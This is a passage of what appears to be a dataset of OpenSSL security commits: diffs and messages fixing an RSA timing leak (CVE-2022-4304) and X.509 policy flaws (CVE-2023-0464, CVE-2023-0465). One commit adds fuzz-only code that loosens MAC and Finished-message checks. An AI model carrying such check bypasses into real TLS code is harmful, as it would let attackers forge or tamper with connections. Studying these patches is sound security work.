    \ = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-            c = (t1 <\
    \ t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  = (t2 > t1);\n+      \
    \  t1 = b[1];\n+        t1 = (t2 - t1) & BN_MASK2;\n+        r[1] = t1;\n+   \
    \     c += (t1 > t2);\n         t1 = a[2];\n-        t2 = b[2];\n-        r[2]\
    \ = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-            c = (t1 <\
    \ t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  = (t2 > t1);\n+      \
    \  t1 = b[2];\n+        t1 = (t2 - t1) & BN_MASK2;\n+        r[2] = t1;\n+   \
    \     c += (t1 > t2);\n         t1 = a[3];\n-        t2 = b[3];\n-        r[3]\
    \ = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-            c = (t1 <\
    \ t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  = (t2 > t1);\n+      \
    \  t1 = b[3];\n+        t1 = (t2 - t1) & BN_MASK2;\n+        r[3] = t1;\n+   \
    \     c += (t1 > t2);\n         a += 4;\n         b += 4;\n         r += 4;\n\
    @@ -408,10 +416,12 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const\
    \ BN_ULONG *b,\n #endif\n     while (n) {\n         t1 = a[0];\n-        t2 =\
    \ b[0];\n-        r[0] = (t1 - t2 - c) & BN_MASK2;\n-        if (t1 != t2)\n-\
    \            c = (t1 < t2);\n+        t2 = (t1 - c) & BN_MASK2;\n+        c  =\
    \ (t2 > t1);\n+        t1 = b[0];\n+        t1 = (t2 - t1) & BN_MASK2;\n+    \
    \    r[0] = t1;\n+        c += (t1 > t2);\n         a++;\n         b++;\n    \
    \     r++;\n@@ -441,7 +451,7 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG\
    \ *a, const BN_ULONG *b,\n         t += c0;                /* no carry */  \\\n\
    \         c0 = (BN_ULONG)Lw(t);                   \\\n         hi = (BN_ULONG)Hw(t);\
    \                   \\\n-        c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n\
    +        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n         } while(0)\n \n\
    \ #  define mul_add_c2(a,b,c0,c1,c2)      do {    \\\n@@ -450,11 +460,11 @@ BN_ULONG\
    \ bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const BN_ULONG *b,\n         BN_ULLONG\
    \ tt = t+c0;    /* no carry */  \\\n         c0 = (BN_ULONG)Lw(tt);          \
    \        \\\n         hi = (BN_ULONG)Hw(tt);                  \\\n-        c1\
    \ = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n+        c1 = (c1+hi)&BN_MASK2; c2\
    \ += (c1<hi);   \\\n         t += c0;                /* no carry */  \\\n    \
    \     c0 = (BN_ULONG)Lw(t);                   \\\n         hi = (BN_ULONG)Hw(t);\
    \                   \\\n-        c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n\
    +        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n         } while(0)\n \n\
    \ #  define sqr_add_c(a,i,c0,c1,c2)       do {    \\\n@@ -463,7 +473,7 @@ BN_ULONG\
    \ bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const BN_ULONG *b,\n         t\
    \ += c0;                /* no carry */  \\\n         c0 = (BN_ULONG)Lw(t);   \
    \                \\\n         hi = (BN_ULONG)Hw(t);                   \\\n-  \
    \      c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n+        c1 = (c1+hi)&BN_MASK2;\
    \ c2 += (c1<hi);   \\\n         } while(0)\n \n #  define sqr_add_c2(a,i,j,c0,c1,c2)\
    \ \\\n@@ -478,26 +488,26 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG\
    \ *a, const BN_ULONG *b,\n         BN_ULONG ta = (a), tb = (b);            \\\n\
    \         BN_ULONG lo, hi;                        \\\n         BN_UMULT_LOHI(lo,hi,ta,tb);\
    \             \\\n-        c0 += lo; hi += (c0<lo)?1:0;            \\\n-     \
    \   c1 += hi; c2 += (c1<hi)?1:0;            \\\n+        c0 += lo; hi += (c0<lo);\
    \                \\\n+        c1 += hi; c2 += (c1<hi);                \\\n   \
    \      } while(0)\n \n #  define mul_add_c2(a,b,c0,c1,c2)      do {    \\\n  \
    \       BN_ULONG ta = (a), tb = (b);            \\\n         BN_ULONG lo, hi,\
    \ tt;                    \\\n         BN_UMULT_LOHI(lo,hi,ta,tb);            \
    \ \\\n-        c0 += lo; tt = hi+((c0<lo)?1:0);        \\\n-        c1 += tt;\
    \ c2 += (c1<tt)?1:0;            \\\n-        c0 += lo; hi += (c0<lo)?1:0;    \
    \        \\\n-        c1 += hi; c2 += (c1<hi)?1:0;            \\\n+        c0\
    \ += lo; tt = hi + (c0<lo);            \\\n+        c1 += tt; c2 += (c1<tt); \
    \               \\\n+        c0 += lo; hi += (c0<lo);                \\\n+   \
    \     c1 += hi; c2 += (c1<hi);                \\\n         } while(0)\n \n # \
    \ define sqr_add_c(a,i,c0,c1,c2)       do {    \\\n         BN_ULONG ta = (a)[i];\
    \                   \\\n         BN_ULONG lo, hi;                        \\\n\
    \         BN_UMULT_LOHI(lo,hi,ta,ta);             \\\n-        c0 += lo; hi +=\
    \ (c0<lo)?1:0;            \\\n-        c1 += hi; c2 += (c1<hi)?1:0;          \
    \  \\\n+        c0 += lo; hi += (c0<lo);                \\\n+        c1 += hi;\
    \ c2 += (c1<hi);                \\\n         } while(0)\n \n #  define sqr_add_c2(a,i,j,c0,c1,c2)\
    \    \\\n@@ -512,26 +522,26 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG\
    \ *a, const BN_ULONG *b,\n         BN_ULONG ta = (a), tb = (b);            \\\n\
    \         BN_ULONG lo = ta * tb;                  \\\n         BN_ULONG hi = BN_UMULT_HIGH(ta,tb);\
    \     \\\n-        c0 += lo; hi += (c0<lo)?1:0;            \\\n-        c1 +=\
    \ hi; c2 += (c1<hi)?1:0;            \\\n+        c0 += lo; hi += (c0<lo);    \
    \            \\\n+        c1 += hi; c2 += (c1<hi);                \\\n       \
    \  } while(0)\n \n #  define mul_add_c2(a,b,c0,c1,c2)      do {    \\\n      \
    \   BN_ULONG ta = (a), tb = (b), tt;        \\\n         BN_ULONG lo = ta * tb;\
    \                  \\\n         BN_ULONG hi = BN_UMULT_HIGH(ta,tb);     \\\n-\
    \        c0 += lo; tt = hi + ((c0<lo)?1:0);      \\\n-        c1 += tt; c2 +=\
    \ (c1<tt)?1:0;            \\\n-        c0 += lo; hi += (c0<lo)?1:0;          \
    \  \\\n-        c1 += hi; c2 += (c1<hi)?1:0;            \\\n+        c0 += lo;\
    \ tt = hi + (c0<lo);            \\\n+        c1 += tt; c2 += (c1<tt);        \
    \        \\\n+        c0 += lo; hi += (c0<lo);                \\\n+        c1\
    \ += hi; c2 += (c1<hi);                \\\n         } while(0)\n \n #  define\
    \ sqr_add_c(a,i,c0,c1,c2)       do {    \\\n         BN_ULONG ta = (a)[i];   \
    \                \\\n         BN_ULONG lo = ta * ta;                  \\\n   \
    \      BN_ULONG hi = BN_UMULT_HIGH(ta,ta);     \\\n-        c0 += lo; hi += (c0<lo)?1:0;\
    \            \\\n-        c1 += hi; c2 += (c1<hi)?1:0;            \\\n+      \
    \  c0 += lo; hi += (c0<lo);                \\\n+        c1 += hi; c2 += (c1<hi);\
    \                \\\n         } while(0)\n \n #  define sqr_add_c2(a,i,j,c0,c1,c2)\
    \      \\\n@@ -546,8 +556,8 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG\
    \ *a, const BN_ULONG *b,\n         BN_ULONG lo = LBITS(a), hi = HBITS(a);  \\\n\
    \         BN_ULONG bl = LBITS(b), bh = HBITS(b);  \\\n         mul64(lo,hi,bl,bh);\
    \                     \\\n-        c0 = (c0+lo)&BN_MASK2; if (c0<lo) hi++; \\\n\
    -        c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n+        c0 = (c0+lo)&BN_MASK2;\
    \ hi += (c0<lo);   \\\n+        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n \
    \        } while(0)\n \n #  define mul_add_c2(a,b,c0,c1,c2)      do {    \\\n\
    @@ -556,17 +566,17 @@ BN_ULONG bn_sub_words(BN_ULONG *r, const BN_ULONG *a, const\
    \ BN_ULONG *b,\n         BN_ULONG bl = LBITS(b), bh = HBITS(b);  \\\n        \
    \ mul64(lo,hi,bl,bh);                     \\\n         tt = hi;              \
    \                  \\\n-        c0 = (c0+lo)&BN_MASK2; if (c0<lo) tt++; \\\n-\
    \        c1 = (c1+tt)&BN_MASK2; if (c1<tt) c2++; \\\n-        c0 = (c0+lo)&BN_MASK2;\
    \ if (c0<lo) hi++; \\\n-        c1 = (c1+hi)&BN_MASK2; if (c1<hi) c2++; \\\n+\
    \        c0 = (c0+lo)&BN_MASK2; tt += (c0<lo);   \\\n+        c1 = (c1+tt)&BN_MASK2;\
    \ c2 += (c1<tt);   \\\n+        c0 = (c0+lo)&BN_MASK2; hi += (c0<lo);   \\\n+\
    \        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n         } while(0)\n \n\
    \ #  define sqr_add_c(a,i,c0,c1,c2)       do {    \\\n         BN_ULONG lo, hi;\
    \                        \\\n         sqr64(lo,hi,(a)[i]);                   \
    \ \\\n-        c0 = (c0+lo)&BN_MASK2; if (c0<lo) hi++; \\\n-        c1 = (c1+hi)&BN_MASK2;\
    \ if (c1<hi) c2++; \\\n+        c0 = (c0+lo)&BN_MASK2; hi += (c0<lo);   \\\n+\
    \        c1 = (c1+hi)&BN_MASK2; c2 += (c1<hi);   \\\n         } while(0)\n \n\
    \ #  define sqr_add_c2(a,i,j,c0,c1,c2) \\"
  - "--- a/crypto/bn/bn_blind.c\n+++ b/crypto/bn/bn_blind.c\n@@ -189,7 +189,8 @@ int\
    \ BN_BLINDING_invert_ex(BIGNUM *n, const BIGNUM *r, BN_BLINDING *b,\n        \
    \     n->top = (int)(rtop & ~mask) | (ntop & mask);\n             n->flags |=\
    \ (BN_FLG_FIXED_TOP & ~mask);\n         }\n-        ret = BN_mod_mul_montgomery(n,\
    \ n, r, b->m_ctx, ctx);\n+        ret = bn_mul_mont_fixed_top(n, n, r, b->m_ctx,\
    \ ctx);\n+        bn_correct_top_consttime(n);\n     } else {\n         ret =\
    \ BN_mod_mul(n, n, r, b->mod, ctx);\n     }"
  - "--- a/crypto/bn/bn_lib.c\n+++ b/crypto/bn/bn_lib.c\n@@ -1106,6 +1106,28 @@ BIGNUM\
    \ *bn_wexpand(BIGNUM *a, int words)\n     return (words <= a->dmax) ? a : bn_expand2(a,\
    \ words);\n }\n \n+void bn_correct_top_consttime(BIGNUM *a)\n+{\n+    int j, atop;\n\
    +    BN_ULONG limb;\n+    unsigned int mask;\n+\n+    for (j = 0, atop = 0; j\
    \ < a->dmax; j++) {\n+        limb = a->d[j];\n+        limb |= 0 - limb;\n+ \
    \       limb >>= BN_BITS2 - 1;\n+        limb = 0 - limb;\n+        mask = (unsigned\
    \ int)limb;\n+        mask &= constant_time_msb(j - a->top);\n+        atop =\
    \ constant_time_select_int(mask, j + 1, atop);\n+    }\n+\n+    mask = constant_time_eq_int(atop,\
    \ 0);\n+    a->top = atop;\n+    a->neg = constant_time_select_int(mask, 0, a->neg);\n\
    +    a->flags &= ~BN_FLG_FIXED_TOP;\n+}\n+\n void bn_correct_top(BIGNUM *a)\n\
    \ {\n     BN_ULONG *ftl;"
  - "--- a/crypto/rsa/rsa_ossl.c\n+++ b/crypto/rsa/rsa_ossl.c\n@@ -257,6 +257,7 @@\
    \ static int rsa_blinding_invert(BN_BLINDING *b, BIGNUM *f, BIGNUM *unblind,\n\
    \      * will only read the modulus from BN_BLINDING. In both cases it's safe\n\
    \      * to access the blinding without a lock.\n      */\n+    BN_set_flags(f,\
    \ BN_FLG_CONSTTIME);\n     return BN_BLINDING_invert_ex(f, unblind, b, ctx);\n\
    \ }\n \n@@ -536,6 +537,11 @@ static int rsa_ossl_private_decrypt(int flen, const\
    \ unsigned char *from,\n         goto err;\n     }\n \n+    if (rsa->flags & RSA_FLAG_CACHE_PUBLIC)\n\
    +        if (!BN_MONT_CTX_set_locked(&rsa->_method_mod_n, rsa->lock,\n+      \
    \                              rsa->n, ctx))\n+            goto err;\n+\n    \
    \ if (!(rsa->flags & RSA_FLAG_NO_BLINDING)) {\n         blinding = rsa_get_blinding(rsa,\
    \ &local_blinding, ctx);\n         if (blinding == NULL) {\n@@ -573,13 +579,6\
    \ @@ static int rsa_ossl_private_decrypt(int flen, const unsigned char *from,\n\
    \             goto err;\n         }\n         BN_with_flags(d, rsa->d, BN_FLG_CONSTTIME);\n\
    -\n-        if (rsa->flags & RSA_FLAG_CACHE_PUBLIC)\n-            if (!BN_MONT_CTX_set_locked(&rsa->_method_mod_n,\
    \ rsa->lock,\n-                                        rsa->n, ctx)) {\n-    \
    \            BN_free(d);\n-                goto err;\n-            }\n       \
    \  if (!rsa->meth->bn_mod_exp(ret, f, d, rsa->n, ctx,\n                      \
    \              rsa->_method_mod_n)) {\n             BN_free(d);"
  commit_message: 'Alternative fix for CVE-2022-4304


    This is about a timing leak in the topmost limb

    of the internal result of RSA_private_decrypt,

    before the padding check.


    There are in fact at least three bugs together that

    caused the timing leak:


    First and probably most important is the fact that

    the blinding did not use the constant time code path

    at all when the RSA object was used for a private

    decrypt, due to the fact that the Montgomery context

    rsa->_method_mod_n was not set up early enough in

    rsa_ossl_private_decrypt, when BN_BLINDING_create_param

    needed it, and that was persisted as blinding->m_ctx,

    although the RSA object creates the Montgomery context

    just a bit later.


    Then the infamous bn_correct_top was used on the

    secret value right after the blinding was removed.


    And finally the function BN_bn2binpad did not use

    the constant-time code path since the BN_FLG_CONSTTIME

    was not set on the secret value.


    In order to address the first problem, this patch

    makes sure that the rsa->_method_mod_n is initialized

    right before the blinding context.


    And to fix the second problem, we add a new utility

    function bn_correct_top_consttime, a const-time

    variant of bn_correct_top.


    Together with the fact, that BN_bn2binpad is already

    constant time if the flag BN_FLG_CONSTTIME is set,

    this should eliminate the timing oracle completely.


    In addition the no-asm variant may also have

    branches that depend on secret values, because the last

    invocation of bn_sub_words in bn_from_montgomery_word

    had branches when the function is compiled by certain

    gcc compiler versions, due to the clumsy coding style.


    So additionally this patch stream-lined the no-asm

    C-code in order to avoid branches where possible and

    improve the resulting code quality.


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20281)'
  commit_sha: f06ef1657a3d4322153b26231a7afa3d55724e52
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/x509_vfy.c\n+++ b/crypto/x509/x509_vfy.c\n@@ -1670,15 +1670,23\
    \ @@ static int check_policy(X509_STORE_CTX *ctx)\n     }\n     /* Invalid or\
    \ inconsistent extensions */\n     if (ret == X509_PCY_TREE_INVALID) {\n-    \
    \    int i;\n+        int i, cbcalled = 0;\n \n         /* Locate certificates\
    \ with bad extensions and notify callback. */\n-        for (i = 1; i < sk_X509_num(ctx->chain);\
    \ i++) {\n+        for (i = 0; i < sk_X509_num(ctx->chain); i++) {\n         \
    \    X509 *x = sk_X509_value(ctx->chain, i);\n \n+            if ((x->ex_flags\
    \ & EXFLAG_INVALID_POLICY) != 0)\n+                cbcalled = 1;\n           \
    \  CB_FAIL_IF((x->ex_flags & EXFLAG_INVALID_POLICY) != 0,\n                  \
    \      ctx, x, i, X509_V_ERR_INVALID_POLICY_EXTENSION);\n         }\n+       \
    \ if (!cbcalled) {\n+            /* Should not be able to get here */\n+     \
    \       ERR_raise(ERR_LIB_X509, ERR_R_INTERNAL_ERROR);\n+            return 0;\n\
    +        }\n+        /* The callback ignored the error so we return success */\n\
    \         return 1;\n     }\n     if (ret == X509_PCY_TREE_FAILURE) {"
  commit_message: 'Ensure that EXFLAG_INVALID_POLICY is checked even in leaf certs


    Even though we check the leaf cert to confirm it is valid, we

    later ignored the invalid flag and did not notice that the leaf

    cert was bad.


    Fixes: CVE-2023-0465


    Reviewed-by: Hugo Landau <hlandau@openssl.org>

    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    (Merged from https://github.com/openssl/openssl/pull/20585)'
  commit_sha: e4142ec43bcc08ffdb090580e24c24a7da302a32
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/x509/pcy_node.c\n+++ b/crypto/x509/pcy_node.c\n@@ -59,16 +59,21\
    \ @@ X509_POLICY_NODE *ossl_policy_level_find_node(const X509_POLICY_LEVEL *level,\n\
    \ X509_POLICY_NODE *ossl_policy_level_add_node(X509_POLICY_LEVEL *level,\n   \
    \                                           X509_POLICY_DATA *data,\n        \
    \                                      X509_POLICY_NODE *parent,\n-          \
    \                                   X509_POLICY_TREE *tree)\n+               \
    \                              X509_POLICY_TREE *tree,\n+                    \
    \                         int extra_data)\n {\n     X509_POLICY_NODE *node;\n\
    \ \n+    /* Verify that the tree isn't too large.  This mitigates CVE-2023-0464\
    \ */\n+    if (tree->node_maximum > 0 && tree->node_count >= tree->node_maximum)\n\
    +        return NULL;\n+\n     node = OPENSSL_zalloc(sizeof(*node));\n     if\
    \ (node == NULL)\n         return NULL;\n     node->data = data;\n     node->parent\
    \ = parent;\n-    if (level) {\n+    if (level != NULL) {\n         if (OBJ_obj2nid(data->valid_policy)\
    \ == NID_any_policy) {\n             if (level->anyPolicy)\n                 goto\
    \ node_error;\n@@ -88,7 +93,7 @@ X509_POLICY_NODE *ossl_policy_level_add_node(X509_POLICY_LEVEL\
    \ *level,\n         }\n     }\n \n-    if (tree) {\n+    if (extra_data) {\n \
    \        if (tree->extra_data == NULL)\n             tree->extra_data = sk_X509_POLICY_DATA_new_null();\n\
    \         if (tree->extra_data == NULL) {\n@@ -101,6 +106,7 @@ X509_POLICY_NODE\
    \ *ossl_policy_level_add_node(X509_POLICY_LEVEL *level,\n         }\n     }\n\
    \ \n+    tree->node_count++;\n     if (parent)\n         parent->nchild++;\n "
  - "--- a/crypto/x509/pcy_tree.c\n+++ b/crypto/x509/pcy_tree.c\n@@ -14,6 +14,17 @@\n\
    \ \n #include \"pcy_local.h\"\n \n+/*\n+ * If the maximum number of nodes in the\
    \ policy tree isn't defined, set it to\n+ * a generous default of 1000 nodes.\n\
    + *\n+ * Defining this to be zero means unlimited policy tree growth which opens\
    \ the\n+ * door on CVE-2023-0464.\n+ */\n+#ifndef OPENSSL_POLICY_TREE_NODES_MAX\n\
    +# define OPENSSL_POLICY_TREE_NODES_MAX 1000\n+#endif\n+\n static void expected_print(BIO\
    \ *channel,\n                            X509_POLICY_LEVEL *lev, X509_POLICY_NODE\
    \ *node,\n                            int indent)\n@@ -161,6 +172,9 @@ static\
    \ int tree_init(X509_POLICY_TREE **ptree, STACK_OF(X509) *certs,\n     if ((tree\
    \ = OPENSSL_zalloc(sizeof(*tree))) == NULL)\n         return X509_PCY_TREE_INTERNAL;\n\
    \ \n+    /* Limit the growth of the tree to mitigate CVE-2023-0464 */\n+    tree->node_maximum\
    \ = OPENSSL_POLICY_TREE_NODES_MAX;\n+\n     /*\n      * http://tools.ietf.org/html/rfc5280#section-6.1.2,\
    \ figure 3.\n      *\n@@ -177,7 +191,7 @@ static int tree_init(X509_POLICY_TREE\
    \ **ptree, STACK_OF(X509) *certs,\n     if ((data = ossl_policy_data_new(NULL,\n\
    \                                      OBJ_nid2obj(NID_any_policy), 0)) == NULL)\n\
    \         goto bad_tree;\n-    if (ossl_policy_level_add_node(level, data, NULL,\
    \ tree) == NULL) {\n+    if (ossl_policy_level_add_node(level, data, NULL, tree,\
    \ 1) == NULL) {\n         ossl_policy_data_free(data);\n         goto bad_tree;\n\
    \     }\n@@ -236,7 +250,8 @@ static int tree_init(X509_POLICY_TREE **ptree, STACK_OF(X509)\
    \ *certs,\n  * Return value: 1 on success, 0 otherwise\n  */\n static int tree_link_matching_nodes(X509_POLICY_LEVEL\
    \ *curr,\n-                                    X509_POLICY_DATA *data)\n+    \
    \                                X509_POLICY_DATA *data,\n+                  \
    \                  X509_POLICY_TREE *tree)\n {\n     X509_POLICY_LEVEL *last =\
    \ curr - 1;\n     int i, matched = 0;\n@@ -246,13 +261,13 @@ static int tree_link_matching_nodes(X509_POLICY_LEVEL\
    \ *curr,\n         X509_POLICY_NODE *node = sk_X509_POLICY_NODE_value(last->nodes,\
    \ i);\n \n         if (ossl_policy_node_match(last, node, data->valid_policy))\
    \ {\n-            if (ossl_policy_level_add_node(curr, data, node, NULL) == NULL)\n\
    +            if (ossl_policy_level_add_node(curr, data, node, tree, 0) == NULL)\n\
    \                 return 0;\n             matched = 1;\n         }\n     }\n \
    \    if (!matched && last->anyPolicy) {\n-        if (ossl_policy_level_add_node(curr,\
    \ data, last->anyPolicy, NULL) == NULL)\n+        if (ossl_policy_level_add_node(curr,\
    \ data, last->anyPolicy, tree, 0) == NULL)\n             return 0;\n     }\n \
    \    return 1;\n@@ -265,15 +280,16 @@ static int tree_link_matching_nodes(X509_POLICY_LEVEL\
    \ *curr,\n  * Return value: 1 on success, 0 otherwise.\n  */\n static int tree_link_nodes(X509_POLICY_LEVEL\
    \ *curr,\n-                           const X509_POLICY_CACHE *cache)\n+     \
    \                      const X509_POLICY_CACHE *cache,\n+                    \
    \       X509_POLICY_TREE *tree)\n {\n     int i;\n \n     for (i = 0; i < sk_X509_POLICY_DATA_num(cache->data);\
    \ i++) {\n         X509_POLICY_DATA *data = sk_X509_POLICY_DATA_value(cache->data,\
    \ i);\n \n         /* Look for matching nodes in previous level */\n-        if\
    \ (!tree_link_matching_nodes(curr, data))\n+        if (!tree_link_matching_nodes(curr,\
    \ data, tree))\n             return 0;\n     }\n     return 1;\n@@ -304,7 +320,7\
    \ @@ static int tree_add_unmatched(X509_POLICY_LEVEL *curr,\n     /* Curr may\
    \ not have anyPolicy */\n     data->qualifier_set = cache->anyPolicy->qualifier_set;\n\
    \     data->flags |= POLICY_DATA_FLAG_SHARED_QUALIFIERS;\n-    if (ossl_policy_level_add_node(curr,\
    \ data, node, tree) == NULL) {\n+    if (ossl_policy_level_add_node(curr, data,\
    \ node, tree, 1) == NULL) {\n         ossl_policy_data_free(data);\n         return\
    \ 0;\n     }\n@@ -367,7 +383,7 @@ static int tree_link_any(X509_POLICY_LEVEL *curr,\n\
    \     /* Finally add link to anyPolicy */\n     if (last->anyPolicy &&\n     \
    \        ossl_policy_level_add_node(curr, cache->anyPolicy,\n-               \
    \                        last->anyPolicy, NULL) == NULL)\n+                  \
    \                     last->anyPolicy, tree, 0) == NULL)\n         return 0;\n\
    \     return 1;\n }\n@@ -550,7 +566,7 @@ static int tree_calculate_user_set(X509_POLICY_TREE\
    \ *tree,\n             extra->flags = POLICY_DATA_FLAG_SHARED_QUALIFIERS\n   \
    \              | POLICY_DATA_FLAG_EXTRA_NODE;\n             node = ossl_policy_level_add_node(NULL,\
    \ extra, anyPolicy->parent,\n-                                              tree);\n\
    +                                              tree, 1);\n         }\n       \
    \  if (!tree->user_policies) {\n             tree->user_policies = sk_X509_POLICY_NODE_new_null();\n\
    @@ -577,7 +593,7 @@ static int tree_evaluate(X509_POLICY_TREE *tree)\n \n    \
    \ for (i = 1; i < tree->nlevel; i++, curr++) {\n         cache = ossl_policy_cache_set(curr->cert);\n\
    -        if (!tree_link_nodes(curr, cache))\n+        if (!tree_link_nodes(curr,\
    \ cache, tree))\n             return X509_PCY_TREE_INTERNAL;\n \n         if (!(curr->flags\
    \ & X509_V_FLAG_INHIBIT_ANY)"
  commit_message: 'x509: excessive resource use verifying policy constraints


    A security vulnerability has been identified in all supported versions

    of OpenSSL related to the verification of X.509 certificate chains

    that include policy constraints.  Attackers may be able to exploit this

    vulnerability by creating a malicious certificate chain that triggers

    exponential use of computational resources, leading to a denial-of-service

    (DoS) attack on affected systems.


    Fixes CVE-2023-0464


    Reviewed-by: Tomas Mraz <tomas@openssl.org>

    Reviewed-by: Shane Lontis <shane.lontis@oracle.com>

    (Merged from https://github.com/openssl/openssl/pull/20571)'
  commit_sha: 3a81370f75b832102e9969533a25ca53fe0b254e
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/ssl/record/methods/tls_common.c\n+++ b/ssl/record/methods/tls_common.c\n\
    @@ -863,6 +863,11 @@ int tls_get_more_records(OSSL_RECORD_LAYER *rl)\n       \
    \          enc_err = 0;\n             if (thisrr->length > SSL3_RT_MAX_COMPRESSED_LENGTH\
    \ + mac_size)\n                 enc_err = 0;\n+#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n\
    +            if (enc_err == 0 && mac_size > 0 && (md[0] ^ thismb->mac[0]) != 0xFF)\
    \ {\n+                enc_err = 1;\n+            }\n+#endif\n         }\n    \
    \ }\n "
  - "--- a/ssl/ssl_sess.c\n+++ b/ssl/ssl_sess.c\n@@ -298,10 +298,15 @@ static int\
    \ def_generate_session_id(SSL *ssl, unsigned char *id,\n                     \
    \               unsigned int *id_len)\n {\n     unsigned int retry = 0;\n-   \
    \ do\n+    do {\n         if (RAND_bytes_ex(ssl->ctx->libctx, id, *id_len, 0)\
    \ <= 0)\n             return 0;\n-    while (SSL_has_matching_session_id(ssl,\
    \ id, *id_len) &&\n+#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n+       \
    \ if (retry > 0) {\n+            id[0]++;\n+        }\n+#endif\n+    } while (SSL_has_matching_session_id(ssl,\
    \ id, *id_len) &&\n            (++retry < MAX_SESS_ID_ATTEMPTS)) ;\n     if (retry\
    \ < MAX_SESS_ID_ATTEMPTS)\n         return 1;"
  - "--- a/ssl/statem/extensions_srvr.c\n+++ b/ssl/statem/extensions_srvr.c\n@@ -44,6\
    \ +44,7 @@ int tls_parse_ctos_renegotiate(SSL_CONNECTION *s, PACKET *pkt,\n {\n\
    \     unsigned int ilen;\n     const unsigned char *data;\n+    int ok;\n \n \
    \    /* Parse the length byte */\n     if (!PACKET_get_1(pkt, &ilen)\n@@ -58,8\
    \ +59,16 @@ int tls_parse_ctos_renegotiate(SSL_CONNECTION *s, PACKET *pkt,\n \
    \        return 0;\n     }\n \n-    if (memcmp(data, s->s3.previous_client_finished,\n\
    -               s->s3.previous_client_finished_len)) {\n+    ok = memcmp(data,\
    \ s->s3.previous_client_finished,\n+                    s->s3.previous_client_finished_len);\n\
    +#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n+    if (ok) {\n+        if\
    \ (data[0] ^ s->s3.previous_client_finished[0] != 0xFF) {\n+            ok = 0;\n\
    +        }\n+    }\n+#endif\n+    if (ok) {\n         SSLfatal(s, SSL_AD_HANDSHAKE_FAILURE,\
    \ SSL_R_RENEGOTIATION_MISMATCH);\n         return 0;\n     }"
  - "--- a/ssl/statem/statem_lib.c\n+++ b/ssl/statem/statem_lib.c\n@@ -787,6 +787,7\
    \ @@ MSG_PROCESS_RETURN tls_process_finished(SSL_CONNECTION *s, PACKET *pkt)\n\
    \     size_t md_len;\n     SSL *ssl = SSL_CONNECTION_GET_SSL(s);\n     int was_first\
    \ = SSL_IS_FIRST_HANDSHAKE(s);\n+    int ok;\n \n \n     /* This is a real handshake\
    \ so make sure we clean it up at the end */\n@@ -831,8 +832,16 @@ MSG_PROCESS_RETURN\
    \ tls_process_finished(SSL_CONNECTION *s, PACKET *pkt)\n         return MSG_PROCESS_ERROR;\n\
    \     }\n \n-    if (CRYPTO_memcmp(PACKET_data(pkt), s->s3.tmp.peer_finish_md,\n\
    -                      md_len) != 0) {\n+    ok = CRYPTO_memcmp(PACKET_data(pkt),\
    \ s->s3.tmp.peer_finish_md,\n+                       md_len);\n+#ifdef FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION\n\
    +    if (ok != 0) {\n+        if (PACKET_data(pkt)[0] ^ s->s3.tmp.peer_finish_md[0]\
    \ != 0xFF) {\n+            ok = 0;\n+        }\n+    }\n+#endif\n+    if (ok !=\
    \ 0) {\n         SSLfatal(s, SSL_AD_DECRYPT_ERROR, SSL_R_DIGEST_CHECK_FAILED);\n\
    \         return MSG_PROCESS_ERROR;\n     }"
  commit_message: 'fuzz: make post handshake reachable


    So that CVE-2021-3449 can be found through fuzzing


    Reviewed-by: Paul Dale <pauli@openssl.org>

    Reviewed-by: Kurt Roeckx <kurt@roeckx.be>

    (Merged from https://github.com/openssl/openssl/pull/20128)'
  commit_sha: 2b9e2afc382490592078cdb69d06f54f0fefd4c6
  repo_name: openssl/openssl
- commit_diff:
  - "--- a/crypto/pkcs7/pk7_doit.c\n+++ b/crypto/pkcs7/pk7_doit.c\n@@ -84,7 +84,11\
    \ @@ static int pkcs7_bio_add_digest(BIO **pbio, X509_ALGOR *alg,\n     }\n  \
    \   (void)ERR_pop_to_mark();\n \n-    BIO_set_md(btmp, md);\n+    if (BIO_set_md(btmp,\
    \ md) <= 0) {\n+        ERR_raise(ERR_LIB_PKCS7, ERR_R_BIO_LIB);\n+        EVP_MD_free(fetched);\n\
    +        goto err;\n+    }\n     EVP_MD_free(fetched);\n     if (*pbio == NULL)\n\
    \         *pbio = btmp;\n@@ -523,7 +527,11 @@ BIO *PKCS7_dataDecode(PKCS7 *p7,\
    \ EVP_PKEY *pkey, BIO *in_bio, X509 *pcert)\n             }\n             (void)ERR_pop_to_mark();\n\
    \ \n-            BIO_set_md(btmp, md);\n+            if (BIO_set_md(btmp, md)\
    \ <= 0) {\n+                EVP_MD_free(evp_md);\n+                ERR_raise(ERR_LIB_PKCS7,\
